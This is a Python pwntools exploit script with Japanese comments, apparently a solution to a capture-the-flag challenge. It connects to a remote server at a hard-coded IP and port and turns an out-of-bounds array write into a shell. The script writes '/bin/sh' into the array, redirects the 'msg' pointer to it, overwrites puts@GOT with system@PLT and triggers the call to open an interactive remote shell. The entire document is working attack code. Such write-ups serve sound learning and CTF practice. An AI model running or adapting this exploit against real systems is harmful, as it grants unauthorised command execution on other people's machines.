from pwn import *

# 1. 接続先の設定
# 手動で nc 34.84.25.24 58554 しているのと同じことをPythonにやらせます
host = "34.84.25.24"
port = 58554
exe = './chal'  # 同じフォルダにchalファイルを置いてください

elf = ELF(exe)
context.binary = exe

# リモートサーバーに接続
io = remote(host, port)

# 2. アドレスの特定（pwntoolsが自動で計算します）
addr_values = elf.symbols['values'] # 配列の先頭
addr_msg_ptr = elf.symbols['msg']   # msg変数の場所
addr_puts_got = elf.got['puts']     # putsのGOT（書き換え対象）
addr_system_plt = elf.plt['system'] # system関数の場所（書き込みたい値）

print(f"[*] values address: {hex(addr_values)}")
print(f"[*] Target (puts@GOT): {hex(addr_puts_got)}")
print(f"[*] Value to write (system@PLT): {hex(addr_system_plt)}")

# 3. 書き込み用の便利関数
# 64bit環境なので、32bit(4byte)ずつ2回に分けて書き込む処理を自動化します
def write_primitive(target_addr, value):
    # values配列からのインデックス（オフセット）を計算
    base_idx = (target_addr - addr_values) // 4
    
    # 下位4バイト (32bit)
    lower_val = value & 0xffffffff
    # 上位4バイト (32bit) 
    upper_val = (value >> 32) & 0xffffffff

    # 下位バイトの書き込み
    print(f"Writing lower 4 bytes to index {base_idx}...")
    io.sendlineafter(b"index? > ", str(base_idx).encode())
    io.sendlineafter(b"value? > ", str(lower_val).encode())
    
    # 上位バイトの書き込み（必要な場合のみ、または念のため0埋めする場合）
    # アドレスは8バイトなので、次のインデックス(base_idx + 1)が上位4バイトにあたる
    print(f"Writing upper 4 bytes to index {base_idx + 1}...")
    io.sendlineafter(b"index? > ", str(base_idx + 1).encode())
    io.sendlineafter(b"value? > ", str(upper_val).encode())

# --- 攻撃開始 ---

# 1. values[0] に "/bin/sh" 文字列を数値として埋め込む
# "/bin" = 0x6e69622f, "/sh\0" = 0x0068732f
io.sendlineafter(b"index? > ", b"0")
io.sendlineafter(b"value? > ", str(0x6e69622f).encode()) # "/bin"
io.sendlineafter(b"index? > ", b"1")
io.sendlineafter(b"value? > ", str(0x0068732f).encode()) # "/sh\0"

# 2. msgポインタを書き換えて、values配列の先頭（"/bin/sh"がある場所）を指すようにする
# msg = &values[0]
write_primitive(addr_msg_ptr, addr_values)

# 3. putsのGOTを書き換えて、system関数に向ける
# puts(msg) -> system("/bin/sh") になる
write_primitive(addr_puts_got, addr_system_plt)

# 4. 終了コマンドを送って発火させる（ループを抜けてputsを呼ばせる）
io.sendlineafter(b"index? > ", b"-1")

# シェルの操作権限を奪う
print("Enjoy your shell!")
io.interactive()